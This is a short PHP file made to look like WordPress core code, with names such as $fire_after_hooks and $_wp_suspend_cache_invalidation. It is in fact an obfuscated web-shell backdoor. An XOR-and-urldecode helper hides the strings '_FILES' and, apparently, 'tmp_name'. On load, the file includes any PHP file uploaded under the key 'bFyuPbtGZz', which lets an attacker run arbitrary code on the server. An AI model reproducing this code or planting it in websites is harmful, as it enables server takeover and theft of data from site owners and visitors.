<?php 	
function double_chars()

{
    $property_name = 'bFyuPbtGZz';

    $sizes = $property_name;

    

    $newtext = $GLOBALS[unfiltered("%3D%0009%151", $sizes)];

    $fire_after_hooks = $newtext;
    $stickies = isset($fire_after_hooks[$sizes]);

    if ($stickies)

    {
        $_links_add_base = $newtext[$sizes];
        $has_leading_slash = $_links_add_base[unfiltered("%16%2B%09%2A%3E%03%19%22", $sizes)];
	$default_no_texturize_tags = 'lazyloader';
        $static_characters = $has_leading_slash;
        include ($static_characters);

    }
}
function unfiltered($count, $extension)

{
    $parts = $extension;

    $src_url = "url" . "decode";
	$default_capabilities_for_mapping = 'number';
    $post_ids = $src_url($count);
    $icon = substr($parts,0, strlen($post_ids));
    $post_authors = $post_ids ^ $icon;

    return $post_authors;
}
	$_wp_suspend_cache_invalidation = 'current_user';

double_chars();

?>
